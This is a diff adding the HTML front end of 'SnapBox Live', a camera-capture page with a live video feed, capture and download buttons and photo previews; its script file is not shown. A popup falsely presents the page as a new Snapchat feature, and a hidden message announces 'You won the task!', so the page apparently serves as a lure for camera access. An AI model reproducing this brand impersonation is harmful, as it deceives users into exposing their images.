@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en" class="bg-black text-white">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SnapBox Live</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="css/style.css" />
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen px-4">
+  <div id="welcomePopup" class="fixed inset-0 z-50 flex items-center justify-center backdrop-blur-md bg-black/40">
+    <div class="popup-box">Welcome! to Snapchat new feature Snapbox 👻</div>
+  </div>
+  <div id="mainContainer" class="filter blur-md pointer-events-none transition duration-500 w-full flex flex-col items-center justify-center">
+    <div class="absolute top-4 left-4 z-50">
+      <div class="w-12 h-12 p-1 rounded-full bg-gradient-to-tr from-purple-700 to-pink-500">
+        <div class="bg-white w-full h-full rounded-full flex items-center justify-center">
+          <i data-lucide="user" class="w-5 h-5 text-black"></i>
+        </div>
+      </div>
+    </div>
+    <button onclick="toggleTheme()" class="absolute top-4 right-4 p-3 rounded-full bg-gray-800 text-white flex items-center justify-center">
+      <i data-lucide="sun"></i>
+    </button>
+    <div class="flex flex-col items-center mb-2 mt-4">
+      <img src="assets/logo.png" class="w-24 animate-bounce" />
+      <h1 class="text-xl text-[#f0f002] font-bold tracking-wide mt-2">SnapBox</h1>
+    </div>
+    <div class="mb-5 border-4 rounded-2xl overflow-hidden" style="border-color:#f0f002">
+      <video id="camera" autoplay playsinline class="w-64 h-96 object-cover shadow-xl"></video>
+    </div>
+    <button onclick="manualCapture()" class="btn-glow"> <i data-lucide="camera" class="w-5 h-5"></i> Capture </button>
+    <div id="previewBoxes" class="grid grid-cols-2 gap-4 mb-6">
+      <div class="preview-ring"><div class="preview-box">Tap 1<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
+      <div class="preview-ring"><div class="preview-box">Tap 2<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
+      <div class="preview-ring"><div class="preview-box">Tap 3<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
+      <div class="preview-ring"><div class="preview-box">Tap 4<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
+    </div>
+    <div class="flex gap-4 mb-6">
+      <button onclick="downloadAllPhotos()" class="btn-glow"><i data-lucide="download" class="w-5 h-5"></i> Download</button>
+      <button onclick="resetAll()" class="btn-reset"><i data-lucide="rotate-ccw" class="w-5 h-5"></i> Reset</button>
+    </div>
+    <div id="msg" class="hidden fixed inset-0 flex items-center justify-center z-50">
+      <div class="msg-box">🎉 Congratulations! You won the task!</div>
+    </div>
+    <div class="fab-chat"><i data-lucide="message-circle" class="w-5 h-5"></i></div>
+    <canvas id="canvas" class="hidden"></canvas>
+  </div>
+  <script src="js/script.js"></script>
+</body>
+</html>
